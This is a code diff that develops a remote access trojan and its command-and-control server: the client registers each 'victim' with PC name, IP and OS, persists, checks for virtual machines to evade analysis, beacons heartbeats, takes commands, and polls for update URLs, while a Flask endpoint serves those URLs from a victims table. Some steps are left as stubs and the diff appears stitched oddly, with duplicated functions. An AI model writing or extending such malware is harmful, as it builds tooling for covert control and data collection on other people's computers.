@@ -154,6 +154,18 @@ def get_system_info():
     
     return pc_name, ip_address, os_info
 
+def check_for_updates():
+    try:
+        response = http_post(f"{SERVER}/api/update", {"victim_id": VICTIM_ID})
+        if response and response.get('success'):
+            update_url = response.get('update_url')
+            if update_url:
+                log(f"Update available: {update_url}")
+                # Implement download and update logic here
+                # Example: download the new executable and replace the current one
+    except Exception as e:
+        log(f"Update check error: {str(e)}")
+
 def main():
     log("=== RAT Starting ===")
     log(f"Version: {VERSION}")
@@ -207,6 +219,7 @@ def main():
                 if isinstance(response, dict) and response.get('command'):
                     log(f"Received command: {response['command']}")
                     # Command execution would go here
+                check_for_updates()
             else:
                 fail_count += 1
                 if fail_count > 10:
@@ -380,10 +393,27 @@ def api_update():
         print(f"Update error: {e}")
         return jsonify({'success': False, 'error': 'Server error'}), 500
 
+# Add a new endpoint to retrieve update URL
+@app.route('/api/update/<string:victim_id>', methods=['GET'])
+def api_get_update(victim_id):
+    try:
+        with get_db() as conn:
+            c = conn.cursor()
+            c.execute("SELECT update_url FROM victims WHERE id = ?", (victim_id,))
+            row = c.fetchone()
+            if row:
+                return jsonify({'success': True, 'update_url': row['update_url']})
+            else:
+                return jsonify({'success': False, 'error': 'Victim not found'}), 404
+        
+    except Exception as e:
+        print(f"Get update error: {e}")
+        return jsonify({'success': False, 'error': 'Server error'}), 500
+
 # Modify the RAT to check for updates
 def check_for_updates():
     try:
-        response = http_post(f"{SERVER}/api/update", {"victim_id": VICTIM_ID})
+        response = http_post(f"{SERVER}/api/update/{VICTIM_ID}", {})
         if response and response.get('success'):
             update_url = response.get('update_url')
             if update_url:
@@ -392,80 +422,3 @@ def check_for_updates():
                 # Example: download the new executable and replace the current one
     except Exception as e:
         log(f"Update check error: {str(e)}")
-
-# Add update check to the main loop
-def main():
-    log("=== RAT Starting ===")
-    log(f"Version: {VERSION}")
-
-    persist()
-    
-    pc_name, ip_address, os_info = get_system_info()
-    
-    is_vm, vm_score, vm_indicators = check_vm()
-    log(f"VM Check: {is_vm} (score: {vm_score})")
-    
-    reg_data = {
-        "victim_id": VICTIM_ID,
-        "pc": pc_name,
-        "ip": ip_address,
-        "os": os_info,
-        "is_vm": 1 if is_vm else 0,
-        "vm_score": vm_score,
-        "activity": "registered"
-    }
-    
-    registered = False
-    for attempt in range(5):
-        log(f"Registration attempt {attempt+1}")
-        if http_post(f"{SERVER}/heartbeat", reg_data):
-            registered = True
-            log("Registration successful")
-            break
-        time.sleep(min(2 ** attempt, 30))
-    
-    if not registered:
-        log("Failed to register, continuing anyway")
-    
-    fail_count = 0
-    while True:
-        try:
-            heartbeat_data = {
-                "victim_id": VICTIM_ID,
-                "pc": pc_name,
-                "ip": ip_address,
-                "os": os_info,
-                "is_vm": 1 if is_vm else 0,
-                "activity": "active",
-                "timestamp": datetime.now().isoformat()
-            }
-            
-            response = http_post(f"{SERVER}/heartbeat", heartbeat_data)
-            
-            if response:
-                fail_count = 0
-                if isinstance(response, dict) and response.get('command'):
-                    log(f"Received command: {response['command']}")
-                    # Command execution would go here
-                check_for_updates()
-            else:
-                fail_count += 1
-                if fail_count > 10:
-                    log("Too many failures, backing off")
-                    time.sleep(300)
-                    fail_count = 0
-            
-            time.sleep(30)
-            
-        except KeyboardInterrupt:
-            break
-        except Exception as e:
-            log(f"Main loop error: {str(e)}")
-            time.sleep(60)
-
-if __name__ == "__main__":
-    try:
-        main()
-    except Exception as e:
-        log(f"Fatal error: {str(e)}")
-        time.sleep(10)
